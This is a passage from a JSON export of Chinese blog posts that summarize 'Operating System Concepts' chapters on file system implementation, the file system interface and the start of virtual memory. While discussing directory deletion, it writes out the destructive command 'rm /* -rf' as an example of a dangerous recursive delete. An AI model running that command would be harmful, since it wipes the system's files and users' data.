的交换空间，或者有的数据库使用生磁盘并将其格式化来满足自己的需求。 引导信息可以包含在多个分区中，通常是一组有序块，并作为镜像文件读入内存。镜像文件会按照预先指定的位置开始执行，它除了可以启动一个特定的操作系统，还可以支持 双引导（dual-booted） ，即启动加载器知道有哪些操作系统、文件系统位于引导区，并可以引导磁盘上不同分区的不同类型的操作系统。 根分区（root partition） 包括操作系统内核以及其它系统文件，它们在引导时装载到内存中，其它卷会根据操作系统的设定，要么在引导时自动装入，要么通过用户手动装入。当有一个新设备挂载（安装）时，操作系统会验证设备上的文件系统是否有效，并根据需要自动/手动纠正。验证通过后，操作系统会在内存中的 挂载表/装入表（mount table） 中标注该文件系统已经装入，并且存储与此文件系统有关的信息。 虚拟文件系统（Virtual File System，VFS） 是文件系统接口和文件系统之间的一层，它的目的有： 定义一个 VFS 接口将文件系统的通用操作和具体实现划分，多个 VFS 接口的实现能够在同一台机器共存，因此它允许访问安装在本地的多种类型的文件系统； VFS 提供了在网络上唯一标识一个文件的机制。它基于 vnode 文件表示结构（包括一个唯一的数值标识符，它能够表明位于整个网络范围内的唯一文件，例如 UNIX 的索引节点 inode 在文件系统内是唯一的）。 目录实现 线性列表（linear list） 是实现目录最简单的方法，运行非常低效。查找文件需要线性搜索，排序列表可以二分搜索，但排序的需求使文件创建/删除复杂化，它的优点在于可直接生成排序目录信息，可用 B 树实现。 哈希表（hash table） ：在线性列表存储目录之上使用哈希表，根据文件名哈希出一个指向线性列表中元素的指针，需要一些措施避免 冲突（collision） 。其困难在于，如果使用固定大小的哈希表，当条目超出哈希表容量时需要扩充哈希表大小，并且设计新的哈希函数将文件名映射到新的范围内。可以使用 chained-overflow 哈希表，使表中元素为一个链表而非单个记录。虽然冲突将使每个链表长度较大，查找可能变慢，但仍比线性搜索快得多。 分配方法连续分配 连续分配（contiguous allocation） 要求每个文件在磁盘上占据连续的块。磁盘地址有一个线性序列，如果只有一个作业按照这个序列的顺序访问磁盘，在访问了块 b 后访问块 b+1 就无需移动磁头，即使需要移动磁头也只需要移动一个磁道（从一个柱面的最后扇区到下个柱面第一扇区）。因此， 访问连续分配文件所需的寻道数最小，即使确实需要寻道，所花费的寻道时间也最小 。在文件连续分配中，一个文件的目录条目包括文件占有的第一个块的地址，以及该文件分配的块的数量（分配区域的长度）。 连续分配文件访问非常容易，既可以顺序访问也可以随机访问。它也存在问题，例如如何为新文件寻找空间，这个问题可看作 内存管理 中 动态存储分配 问题的一个具体应用，即如何从一个空闲的孔列表中寻找一个满足大小为 n 的空间，常用首次适应和最佳适应。 连续分配方案的另一个问题是需要确定文件需要多少空间，这个知识是无法预知的。如果为一个文件分配的空间过小则文件可能无法原地扩展文件，这时要么终止用户程序并通知用户必须分配更多空间才能运行（这样用户就会过高的预估所需的磁盘空间造成浪费），要么找一个更大的孔，将文件复制到新空间，释放旧空间，但这比较耗时。 修正的连续分配方案：开始时为文件分配一块连续空间，一旦空间不够，另一块称为 扩展（extent） 的 连续空间 就会被分配给文件。这种情况下，文件块的位置就需要通过开始块地址、块数、指向下一个扩展的指针三项来确定。如果扩展太大，内部碎片会变得严重；随着扩展的分配、删除，外部碎片也将变得严重。 链接分配 链接分配（linked allocation） 解决了连续分配的全部问题。链接分配中，每个文件由分布在磁盘上各个位置的多个磁盘块组成，文件目录条目记录了一个文件第一块的指针和最后一块的指针。每一块都会有一个指向下一块的指针，用户无法使用存储这些指针的空间（例如一块有 512B，磁盘地址为 4B，则用户只可用 508B）。 链接分配对于创建/读/写文件的操作如下： 创建新文件时只要简单的在目录中增加一个新条目，条目中有指向文件第一块的指针，初始化为 nil 以表明这是空文件，大小字段也是 0。 写文件时通过空闲空间管理器寻找一个空闲块，这个块会被写入数据、链接到文件最后一个块的尾部，同时要更新这个文件在目录中条目的记录值（大小、最后一个块的地址）。 读文件通过条目中存储的第一个块的地址，逐个向后寻找。 链接分配的缺点在于： 只能用于文件的顺序访问，要找到文件的第 i 块必须要从第一块开始寻找，每次访问都需要读磁盘，这还需要涉及磁盘寻道的延迟。因此 链接分配无法有效支持文件直接访问 。 指针需要空间，每一块都有一定空间被指针占用。这个问题的解决方法是将多个块组成 簇（cluster） ，按簇而不是块来分配（如一个簇有 4 块）。这样指针占用的磁盘空间百分比会下降，但增加了内部碎片。簇可以改善多数算法中的磁盘访问时间，因此在绝大多数操作系统中得到应用。 可靠性：文件通过指针链接，一旦有一个指针丢失/损坏，整个文件都将崩溃。一个逃避性的解决方案是采用双向链表，或者给每个块存上文件名和相对块数（相对第一块是第几块），但这又增加了过多的额外开销。 链接分配方法的一个变种是 文件分配表（file-allocation table，FAT） ，它被应用于 MS-DOS 和 OS/2 操作系统。每个卷的开始部分存储文件分配表，卷内的每一块都在表中占有一项，这个表可以通过块号码索引， 表中存储的值是这一块指向的下一块块号 。 文件在目录中的条目只含有文件第一块的块号，访问文件时按照 FAT 表中存储的链接关系一直向下寻找，直到最后一块（最后一块在 FAT 表中标记为一个特殊的文件结束值，可以根据这个值判断是否为最后一块）。 要分配一个新的块，只需要在 FAT 表中找到第一个值为 0（值为 0 表示一个块没有被使用）的块，用新块的地址替换掉此前最后一块的文件结束值，并且用文件结束值替换 FAT 表中的 0。 FAT 需要采用缓存才能提高效率，否则可能导致大量的磁头寻道时间：磁头要移动到卷的开头读入 FAT 以获得块的位置，然后才能移动到块本身。最坏情况下每块的读取都要移动两次。但它的优点在于改善了随机访问时间， 因为 FAT 的存在，操作系统可以快速找到文件任意一块的位置 。 索引分配 如果不采用 FAT，链接分配就无法有效支持直接访问，因为块指针散布在整个磁盘，必须顺序读取。 索引分配（indexed allocation） 把所有指针放到一起，通过 索引块（index block） 解决此问题。 每个文件都有自己的索引块，它是一个磁盘块地址的数组。索引块的第 i 个条目代表文件的第 i 个块，条目中含有索引块的磁盘地址。要读取第 i 块只需要通过索引块第 i 个条目存储的指针来访问（类似第八章分页）。 创建文件：索引块中所有指针设为 nil。 第一次写入第 i 块：从空闲空间管理器获取一个空闲块，将数据写入块，并将块地址写到索引块的第 i 个条目中 索引分配支持直接访问且没有外部碎片问题，但索引分配会浪费空间 ：如果一个文件只有两块长，链接分配只需要每块浪费一个指针，而索引分配需要为这个只有两块的文件创建一个完整的索引块，这个索引块里只有两个指针被使用到。 索引块的大小需要经过仔细考量：每个文件都有一个索引块，索引块太大会造成浪费，太小又不足以满足大文件存储需求。针对这一问题的处理机制有如下几点： 链接方案（Linked scheme） ：一个索引块就是一个磁盘块。它本身能够直接读写，当遇到大文件存储时可以将多个索引块链接。例如一个索引块可以包含一个头部（头部包含文件名）以及 100 个磁盘块的地址。索引块的最后一个存储单元存储着指向下一个索引块的地址如果是小文件则这个指针为 nil，如果是大文件则指向了另一个索引块。 多层索引（Multilevel index） ：设置两层索引块，第一层指向第二层，第二层指向文件块。根据最大文件大小的不同，可以继续到第三/四层。对于块大小为 4KB 的情况，可以在一个索引块里装入 1024 个 4B 指针，两层索引就可以容纳 1048 576 个数据块，即最大文件为 4GB。 组合方案（Combined scheme） ：在 UFS 中使用了这种方案。将索引块的前 15 个指针存在文件的 inode 里，这 15 个指针中：前 12 个直接指向了数据块，这样不超过 12 块的文件就不需要其它索引块；后 3 个指针分别是一级间接块、二级间接块、三级间接块指针。这种方法允许一个文件的块数超过 4B 文件指针能访问的空间。许多 UNIX 系统支持 64 位文件指针，这时允许文件/文件系统达到数 T 字节。UNIX 的inode 大致如下： 索引分配方案和链接分配方案在性能上都有欠缺，虽然索引块能够缓存在内存里，但数据块会分布到整个分区中。 性能 连续分配对于任意类型的访问都只需要访问一次，链接分配可以将下一块的地址放到内存中并能直接读取，但对于直接访问需要读多次磁盘。所以有些系统通过使用连续分配支持文件直接访问，通过链接分配支持顺序访问。这种系统在创建文件时就要指明文件的类型（顺序访问还是直接访问），如果是直接访问还必须说明最大文件大小。 索引分配非常复杂。如果索引块已在内存中则可以直接访问，但将索引块保存在内存中需要非常大的空间。尤其是多级索引，对于一个大文件来说，如果要访问文件末尾部分的数据，可能需要将所有索引块读入内存才能读到需要的数据库。所以索引分配的性能依赖于索引结构、文件大小和所需要的块的位置。 有的系统把连续分配和索引分配结合，对于小文件（3、4块大小的）采用连续分配，大文件切换到索引分配。因为文件系统中大多数文件较小，所以小文件连续分配效率较高，平均性能较好。 由于 CPU 和磁盘速度不等，花费数千条 CPU 指令来节省一些磁头移动都是值得的，随着时间推移，这种不等程度还会增加。 空闲空间管理 系统需要维护 空闲空间链表（free-space list） 以记录空闲磁盘空间，创建文件时会从空闲空间链表分配，删除文件时磁盘空间会加回到空闲空间链表上（称之为链表但不一定表现为链表）。 位向量 将空闲空间用 位图（bit map） 或 位向量（bit vector） 表示，每块用一位说明是否为空闲，1 表示空闲，0 表示已经分配。 此方式查找磁盘上第 1 个空闲块和 n 个连续空闲块时简单高效： 按顺序检查位图中的每个字是否为 0 即可确定对应的块是否已经全部分配，第一个非 0 的字中，第一个 1 位偏移旧对应着第一个空闲块； 连续 n 个空闲块只需要判断是否有连续 [n / 字的位数] 个字均为最大值（如一个字就是一个字节时，只要连续有 [n / 8] 个字节全为 255 就说明这部分块都空闲）。 除非整个位向量都能保存在内存中，否则位向量的效率不高。对于小磁盘，位向量的大小可以接受，但对于大磁盘而言（如 40GB，每块 1KB）就需要超过 5MB 空间存储位图。 链表和组 将所有空闲磁盘块用 链表（Linked List） 链接，将指向第一个空闲块的指针放在磁盘的一个特殊位置，同时也缓存到内存里。第一块空闲块中包含了指向下一个空闲磁盘块的指针。 此方案效率不高，要遍历整个空闲块列表需要从磁盘读出每一块，这要耗费大量 I/O 时间。不过通常操作系统只需要获得一个空闲块以提供给文件，因此一般只需要分配空闲表的第一块。 组（grouping） 是对空闲链表的改进：将 n 个空闲块的地址存在第一个空闲块里，前 n-1 个地址都指向真正的空闲块， 最后一个地址指向了另一个包含另外 n 个空闲块的块地址 。 计数 通常会有多个连续的块需要同时分配、释放，尤其是采用了连续分配或簇的情况下。因此可以不记录 n 个空闲块地址，而是记录连续多块空闲块的第一块的地址，以及连续的空闲块的数量。这样空闲空间表的每个条目包含了第一个空闲块地址和连续空闲块数量，虽然每个条目占用的空间增长了，但表的总长度会缩短（连续空闲块的数量往往大于 1）。 UNIX 成组链接（补充） 将文件存储设备中的所有的空闲块 从后向前 按 50 块为一组进行划分，每组的第一块用于存放 前一组 的总块数和每块的块号，因为第一组前面已经没有其他组存在，所以第一组实际有 49 块。因为存储空间不一定正好是 50 的整数倍，所以最后一组可能不足 50 块。因为最后一组后面没有其他组，所以最后一组的总块数和每块块号的信息存放到管理文件存储设备的文件资源表中。如下图所示。 操作系统启动时将文件资源表复制到内存，此时文件资源表中包含了最后一组的空闲块总数以及空闲块的块号。操作系统还会设置一个用于空闲块分配、回收的堆栈，堆栈存储着空闲块的块号，栈指针 ptr 的初值等于最后一组的空闲块的总块数。 成组链接分配方法：申请者请求获得 n 块空闲块，操作系统将按照先进先出的原则，将栈顶指向的块号分配给请求者，同时 ptr 自减。重复此操作直到 n 块分配完毕，或者堆栈中只剩下最后一个空闲块的块号（此块实际存储的是下一组的空闲块块数和各块块号）。当堆栈只剩下最后一个空闲块的块号时： 从堆栈中弹出该块的块号，系统启动 I/O 设备，将该块存放的内容读入内存（即将下一组空闲块号和总块数读入空闲资源表），并设置 ptr 为下一组的空闲块数 文件存储设备的最后一个空闲块中设置有尾部标识，表示空闲块已经分配完毕 成组链接回收方法：用户删除某个文件时，ptr 自增并将空闲块号入栈。若 ptr 为 50 则表明当前已经凑足一组，该组回收结束。 如果还有空闲物理块 F 需要回收，则将块 F 回收，并且启动设备 I/O，把栈中记录的 50 个块号和块数（50）写入到块 F 中。设置 ptr 为 1，将块 F 的块号入栈，开始新的一组空闲块回收。 对空闲块的分配和回收操作必须互斥进行（栈操作要互斥）。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（十）：文件系统接口此专栏的下一篇文章：操作系统（十二）：大容量存储器结构 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/05/os-concepts-11/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（十）：文件系统接口","slug":"os-concepts-10","date":"2017-01-05T03:55:47.000Z","updated":"2017-01-11T13:55:32.000Z","comments":true,"path":"2017/01/05/os-concepts-10/","link":"","permalink":"http://forec.github.io/2017/01/05/os-concepts-10/","excerpt":"整理《Operating System Concepts》 第七版第十章文件系统接口部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第十章文件系统接口部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 文件系统概念、属性和操作 信息可以在多种介质上存储，为了方便使用，操作系统为不同的信息存储设备提供了统一的逻辑接口：对存储设备的各类属性加以抽象，定义了逻辑存储单元（文件），之后再将文件映射到非易失性的物理设备上。 文件是 一系列有名称的、记录在二级存储器上的信息集合 。在用户眼里，文件是逻辑外存的最小分配单元，数据必须通过文件的形式才能写入到外存。文件根据不同的类型有一定 结构（structure） ，例如 文本文件 由行（页）组成，每行又由字符组成； 源文件 由子程序和函数组成，子程序和函数又由声明、执行语句组成； 目标文件 是一系列字节序列，按目标系统链接器所能理解的方式组成； 可执行文件 为一系列可以装入程序调入内存执行的代码段。 所有文件的信息都保存在文件系统的目录结构中，目录结构（必须也是非易失性的）也保存在外存中。 文件属性（file attributes） 通常包括： 名称：文件符号名称，按人类理解方式保存 标识符：文件系统内标识此文件的唯一标签，通常为数字 类型：此字段仅对于支持多类型文件系统有效 位置：指向设备和设备上该文件位置的指针 大小：文件当前大小，也可表示文件允许的最大容量 保护：读、写、执行控制权限 时间、日期、用户标识：文件创建、上次修改、最近访问等信息，用于保护、安全以及使用记录的追踪 文件属于 抽象数据类型（abstract data type） ，文件操作的最小集合包括如下六条，这六条基本操作可以组合以实现其他文件操作： 创建文件：包括在文件系统中为文件找到空间并分配、在文件目录中为新文件创建条目； 写文件：系统要为文件维护一个写位置的指针，一旦发生写操作就需要更新写指针（写方式 fopen 返回值就是一个写指针）； 读文件：系统也需要为文件维护读指针，一个进程通常只对一个文件读或写，故当前操作位置（读/写指针）可作为每个进程 当前文件位置指针（current-file-position pointer） ； 文件内重定位（repositioning within a file）：修改文件位置指针的值（seek 操作，文件寻址），这不需要执行真正的 I/O； 删除文件：需要在目录中搜索给定名称文件，释放其空间并删除文件目录中的条目； 截短（truncating）：删除文件内容而保留属性，将文件长度设为 0 并释放空间。 操作系统维护一个 打开文件表（open-file table） ，当需要一个文件时，操作系统根据这个表的索引来指定文件，避免了每次文件操作都要搜索文件目录。有的系统会在首次引用文件时隐式地打开它，绝大多数操作系统要求程序员通过 open() 操作显示地打开文件，并将文件条目复制到打开文件表中。当文件不再使用时，进程可以 关闭 这个文件，操作系统会从打开文件表删除文件对应的条目。系统调用 open() 会返回一个 指向打开文件表中一个条目的指针 ，所有 I/O 操作会通过使用该指针来进行。 多个进程同时打开同一文件的情况下，操作系统通常采用 两级内部表 ：单个进程的表和整个系统的表。其中单个进程的表追踪单个进程打开的所有文件（该进程对文件的使用信息，如该进程对该文件操作的指针位置、权限等），表中的每一个条目指向整个操作系统打开文件表中相对应的一项。而操作系统的打开文件表（整个系统的表）包含着与进程无关的文件信息（文件在磁盘的位置、大小等），一旦一个文件第一次被进程打开，操作系统会在打开文件表中增加相应的条目；而 一个已经被打开的文件再次被其它进程打开时，仅仅在进程的打开文件表中增加一个指向整个系统表的相应条目 。一般系统维护的打开文件表中，每个文件会有一个文件打开计数器，用来记录多少进程打开了该文件，当计数器降到 0 时标识文件不再使用，可以从打开文件表删除。 以上，每个打开文件应当包括如下信息： 文件指针：这个属性对于每个进程都可能不同，因此它保存在进程各自的打开文件表中，每个进程都需要为自己打开的每个文件维护一个文件指针。 文件打开计数器：此属性保存在操作系统的文件打开表中，操作系统等待所有进程均不在引用某文件（计数器为 0）后才会将其条目删除。 文件磁盘位置：这一属性用于定位磁盘上的文件位置，保存在操作系统的打开文件表中。 访问权限：此属性保存在进程各自的打开文件表中，操作系统根据进程各自的访问模式决定是否允许进程的 I/O 请求。 部分操作系统提供了 文件锁 以允许一个进程锁住文件，禁止其他进程访问。文件锁可以用于多个进程共享的文件（如多个进程访问、修改的系统日志）。其中， 共享锁（shared lock） 类似 进程同步 中读者-写者问题的读者锁，它允许多个进程并发获取； 专用锁（exclusive lock） 类似写者锁，只有一个进程可以获取此锁。有的操作系统只提供专用锁。另外，操作系统可以提供 强制（mandatory） 或者 建议（advisory） 文件加锁机制，如果文件锁是强制的，那么操作系统会禁止其它进程访问一个已经加锁的文件；如果文件锁是建议的，则操作系统不会禁止。因此，对于建议加锁，程序开发者要确保进程适当的获取、释放锁。通常 Windows 系统采用强制加锁，而 UNIX 系统采用建议加锁。 类型和结构 不同的应用程序可以使用不同的扩展名来指明文件。UNIX 系统采用 幻数（magic number） 表明文件类型，这部分数据保存在文件的开始位置（不是所有的文件都具有幻数）。UNIX 也不记录文件创建程序的名称，但仍允许通过文件扩展名来确定文件内容类型。 文件类型可用于表示文件的内部结构（例如源代码文件和目标文件都有一定的结构来适应对应处理程序的要求），这些文件必须符合操作系统要求的结构。随着操作系统支持文件结构种类的增加，操作系统也会增大。很多操作系统 支持最少数量的文件结构 （包括 UNIX、MS-DOS），如 UNIX 认为每个文件是 8 位字节序列组成，操作系统不会去试着解释这些位。这样的方案提供了很高的灵活性（但是操作系统本身并不提供任何支持），应用程序必须通过自己的代码去解释输入的文件。当然操作系统必须至少支持可执行文件结构。 磁盘系统通常有明确定义的块（由扇区大小决定），所有磁盘 I/O 均按块执行。因为物理块大小通常不会和文件操作的逻辑记录长度相同，因此文件系统将若干个逻辑记录 打包（packing） 成块再执行 I/O 操作。同样，由于磁盘空间按块划分，文件最后一块的部分空间通常会被浪费，产生内部碎片，块越大内部碎片也越大。 访问方法和文件系统挂载访问方法 顺序访问（Sequential Access） ：文件信息按顺序处理。这种访问模式最常用，如编辑器、编译器等均按此种方式访问。大量文件操作都是读写操作，两种操作都会向某一方向移动文件指针。顺序访问基于文件的磁带模型（读写/倒回），对顺序访问设备和随机访问设备都适用。 直接访问（Direct Access） ：也称 相对访问（relative access） ，文件由固定长度的 逻辑记录（logical records） 组成，因此程序可以直接计算出文件所在的块并快速读写（磁盘允许对任意块进行随机读写）。数据库通常使用这种类型的文件。因为随机读写以块为目标，故文件操作要经过修改从而将块号作为参数。有两种方式：一是将 读下一个字节 变成 读 n ，将 写下一个字节 变成 写 n ；另一种则是仍使用 读下一个 和 写下一个 ，但是增加了 定位文件到 n 的操作。用户向操作系统提交的块号是 相对块号（relative block number） ，是相对于文件开始的索引。 不是所有的操作系统都支持顺序访问和直接访问，部分系统只允许顺序或随机访问，有的则再文件创建时指定文件是顺序还是随机访问。对于直接访问的文件，可以非常容易的模拟出顺序访问，而在顺序访问文件中模拟直接访问是非常低效的。 其他访问方式通常建立在直接访问之上，涉及文件 索引（index） ，索引包含了各个块的指针。要查找文件记录，要先搜索索引，然后根据指针直接访问文件。 文件系统挂载 文件系统在使用前必须 挂载（mount） ，中文版翻译称为 安装 。操作系统需要知道设备名称，以及这个设备在文件系统中的挂载（安装）位置，这个位置称为挂载点（mount point），通常是一个空目录。 操作系统会验证一个挂载（安装）的设备是否包含一个有效文件系统，验证流程如下：通过设备驱动程序读入设备目录，验证目录是否符合操作系统期待的格式。验证通过后操作系统会在目录结构中记录这个文件系统已经被安装在挂载点上。 目录结构 磁盘（或其他大存储设备）可以当作整体运用在一个文件系统中，但有时需要在一个磁盘上安装多种文件系统。磁盘上各个部分称为 分区（partitions） 或 片（slices） ，或称为 小型磁盘（minidisk，IBM） 。每个磁盘分区可以创建一个文件系统，这些部分可以组合起来成为更大的结构 卷（volume） ，也可以在卷上创建文件系统。下面将 存储文件系统的一大块空间作为卷 ，卷可以存放多个操作系统。包含文件系统的卷需要记录文件系统中的信息，这些信息保存在 设备目录（device directory） 或 卷表（volume table of contents） 中，它记录了卷上所有文件信息（名称、位置、大小、类型等）。 目录可以视作符号表，将文件名称转换成目录条目。目录需要支持如下操作： 在目录中搜索文件 创建文件 删除文件 遍历目录 重命名文件 跟踪文件系统：定期备份整个文件系统 组织目录结构的要求（补充）： 高效（能够快速定位文件） 命名（用户要方便命名、不同用户可以有同名文件、同一文件可以有多个名称） 成组（可以按照文件属性划分成组） 单层结构目录（single-level directory） ：所有文件保存在同一目录中，便于理解和支持。但当文件类型增加或者系统需要为多个用户提供服务时，必须保证所有文件名称唯一。文件名称长度有限，MS-DOS 只允许 11 个字符，UNIX 允许 255 个字符。 双层结构目录（two-level） ：单层目录结构会在不同用户直接引起文件名混淆，双层结构目录中，每个用户有自己的 用户文件目录（user file directory，UFD） ，每个 UFD 都有相似的结构，但只包含所属用户的文件。用户作业执行/用户注册时，搜索主系统的 主文件目录（master file directory，MFD） 来检索到用户的 UFD，这允许多个用户拥有相同名称的文件。 双层结构目录能够有效地对用户隔离，但不利于用户之间的合作和文件共享。双层结构目录等价于一棵高度为 2 的倒置树。 对于系统库等每个进程都需要的文件，双层结构目录必须将这些系统文件复制到每个 UFD 下，这导致大量空间浪费，解决方法是修改搜索步骤，在根目录下定义一个特殊的用户目录，目录中包含所有的系统文件。当进程在 UFD 查找不到需要的文件时会搜索这个特殊用户目录。给定一个文件，搜索的一系列目录称为 搜索路径（search path） 。 树状目录结构（tree-structured directories） ：允许用户创建自己的子目录，系统内每个文件有唯一路径名。目录包括一组文件和子目录，目录实际也是一个按特殊方式访问的文件，文件系统中每个条目都需要一位定义其为文件（0）还是子目录（1），并且删除目录条目需要特殊的系统调用。 通常每个进程有一个当前目录， 当前目录（current directory） 包括进程当前感兴趣的多数文件，引用文件时也会先搜索当前目录。 路径名分 绝对路径名（absolute path name） 和 相对路径名（relative path name） 。绝对路径名从根开始给出路径上的目录名，一直到指定文件；相对路径名从进程的当前目录开始定义路径。 删除目录：如果目录为空可以直接删除，若目录不为空，有的系统不允许删除不为空的目录（MS-DOS，要删除一个有内容的目录就必须先清空整个目录内的文件），有的系统则提供了选择（选择是否允许删除全部子目录和文件，这样更危险，比如 rm /* -rf）。 用户除了可以访问自己的文件，还可以通过路径名访问其他用户文件。 无环图目录（acyclic graph） ： 树状结构禁止共享文件和目录 ，无环图允许目录含有共享子目录和文件。无环图是树状结构目录的扩展。 共享目录不同于文件复制，共享情况下任何一个用户对文件做出的改动都对其它共享用户可见。 实现 共享目录方法 1：创建一种称为 链接（link） 的新目录条目，链接实际是另一个文件/目录的指针，操作系统可以通过链接保存的路径名定位真实文件（这一行为称为 解析（resolve） 。 实现共享目录方法 2：每个用户都有共享文件的副本，但这些副本时刻更新着所有被共享文件的信息。但这样做会使副本和原始的文件无法区分，并且一旦有用户修改了副本/原始文件，所有其它副本都需要修改以维护一致性。 实现 共享目录问题 1：一个文件被共享，因此可能会有多个绝对路径指向了同一个文件，这时对于遍历文件系统/查找文件/统计文件数量/备份文件等操作，需要解决不重复计算的问题。 实现共享目录问题 2：分配给共享文件的空间何时可以删除？若用户删除文件即删除，则会留下很多悬挂链接指向不存在的文件，如果删除部分的空间被其它文件使用，这样链接又会指向其他文件的某个部分。可以在文件删除时搜索并删除这些悬挂的链接，但相对耗时；或者直到某个进程使用了某个悬挂链接时再去清理（UNIX 和 Windows 系统均不会在删除文件时删除链接，而由用户意识到原来文件已经删除） 实现共享目录问题 3：删除共享文件的另一种方式是保留文件直到所有指向该文件的引用都删除为止。这样需要为每个文件维护一个引用列表，这个引用列表可能很大。因此可以用一个计数器代替引用列表。UNIX 操作系统对 硬链接（hard links，非符号链接） 采用了这种方式。 通用图目录（general graph） ：无环图结构必须确保没有环，而对于无环图的共享部分，如果搜索一个共享子目录没有找到文件，就应该避免通过其它链接再次搜索这个共享子目录（浪费时间）。如果目录中甚至有环存在（例如子目录又包含了到父目录的链接），就更要避免循环搜索。 避免循环搜索：限制搜索时访问目录的次数。 删除文件：可能出现文件自我引用，这时需要垃圾收集机制确定什么时候可以删除引用。垃圾收集需要遍历整个文件系统并将所有能够访问到的空间标记，之后第二次遍历将第一遍没有标记的位置收集到空闲空间链表上。 如何避免无环：仅允许链接到一个没有子目录的文件；垃圾回收；每次新链接加入都运行环检测算法判断。 文件共享 多用户操作系统必须控制文件共享。系统可以默认允许一个用户访问其他用户文件，也可以要求一个用户授予文件固定的访问权限。多用户系统需要比但用户系统维护更多的文件和目录属性，现在绝大多数系统采用了文件（目录） 拥有者（owner，user） 和 组（group） 的概念，其中拥有者控制权最高，拥有者的 ID 会和文件属性一起保存。同一组的成员具有相同的权限，并只能执行拥有者具有权限的子集。 远程文件系统的实现方式包括： 用户通过程序（ftp）在机器之间传输文件 分布式文件系统（Distributed Information System） ：远程目录可以从本机直接访问 万维网（和 ftp 类似，基本是 ftp 的包装）：用浏览器下载文件 C/S模型（客户机-服务器模型）：服务器包含文件，客户机访问文件。服务器需要表明目录和卷的哪些文件可用，而客户机的身份需要通过网络名称/IP 或者其它标识符鉴别（这些可能被欺骗/模仿），因此客户机需要通过加密密钥向服务器进行安全验证，安全验证也会遇到很多问题，所以多数情况还是使用不太安全的验证。 故障模式（Failure Modes） ：本地文件系统可能因为某些原因出错，比如包含文件系统的磁盘老化，目录结构或者其它磁盘管理信息（统称为 元数据，metadata ）损坏等。用户或管理员的冒失也会导致文件丢失/整个目录删除等。远程文件系统因为网络因素，需要有更多的故障模式，客户机和服务器之间 需要对每一次远程请求记录信息 以在故障发生时能够恢复。类似 NFS 的协议对每个请求的信息都加以记录，因此能够很容易的从故障中恢复，但安全性较差。 一致性语义（Consistency Semantics） ：描述多用户同时访问共享文件时的语义，规定了一个用户修改的数据什么时候对另一个用户可见。 UNIX 语义（UFS）：用户对已经打开的文件进行写操作会立刻被其它同时打开这一文件的用户可见，还有一种共享模式会共享文件指针的位置，一个文件移动了文件指针会影响其他用户，文件有一个映像，这个映像允许来自不同用户的交替访问（映像是互斥资源）。 AFS 文件系统：用户对打开文件的写操作不会立刻被其他用户可见，一旦文件关闭，对文件的修改只能被以后打开的会话所见，已经打开文件的用户无法看到这些修改。一个文件会有多个物理映像，用户允许对自己的映像进行不受限制的读写操作（没有互斥）。 不可修改共享文件语义：文件不可修改，即只读（文件名不能重用、文件内容不可修改）。 保护 计算机系统中保存的信息必须能够免受物理损坏（可靠性）和非法访问（保护）。对于多用户系统尤其需要某些机制。 访问类型：需要 控制访问（controlled access） 来限制可以进行的文件访问类型，访问类型包括：读、写、执行、添加、删除、列表清单（获取文件名称、属性等）。更多操作（重命名、编辑等）都是这些底层操作的组合，因此保护只需要在底层提供，高层操作涉及的底层操作如果不满足保护的要求就会被拒绝。 访问控制：根据用户身份判断能否对某个文件访问。每个文件/目录都增加一个 访问控制列表（access-control list，ACL） 来指定每个用户对这个文件/目录具有的合法的访问类型。缺点是访问控制列表会较长，并且一般事先无法知道系统的用户列表，这将导致更复杂的空间管理。 操作系统为每个文件提供了三种用户类型：拥有者、组（一组需要共享文件并且具有相同访问需求的用户集合）、其他用户。Linux 中每种类型的用户都有 rwx 三个位。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（九）：虚拟内存此专栏的下一篇文章：操作系统（十一）：文件系统实现 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/05/os-concepts-10/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（九）：虚拟内存","slug":"os-concepts-9","date":"2017-01-03T16:42:29.000Z","updated":"2017-01-11T13:38:54.000Z","comments":true,"path":"2017/01/04/os-concepts-9/","link":"","permalink":"http://forec.github.io/2017/01/04/os-concepts-9/","excerpt":"整理《Operating System Concepts》 第七版第九章虚拟内存部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。","text":"整理《Operating System Concepts》 第七版第九章虚拟内存部分，内容均为原书和中文版翻译的摘录，其中原书摘录部分由我 按个人理解简化、翻译为中文，可能存在一些不准确之处 。 背景 虚拟内存技术允许进程在执行时不完全加载入内存（动态加载也可以实现，但要求程序员做更多细致的工作），因此程序可以远大于物理内存。虚拟内存将内存抽象为一个 统一的 巨大的统一存储数组，使用户看到的逻辑内存和物理内存分离，允许程序员不受内存存储限制。此外虚拟内存使进程共享文件/地址空间变得容易。 很多情况下不需要将整个程序加载到内存中，如： 程序执行过程中通常很少发生错误，处理异常错误的代码几乎不被执行 数组、链表、表等结构通常会被分配比实际需要的更大的内存 程序的一些功能/选项很少被使用 只将程序的一部分加载入内存可以带来如下优势： 程序不再受物理内存空间限制，用户可以针对一个远超过物理内存大小的 虚拟地址空间（virtual address space） 编写程序从而简化编程工作量； 更多的程序可以同时执行（每个程序使用了更少的物理内存），CPU 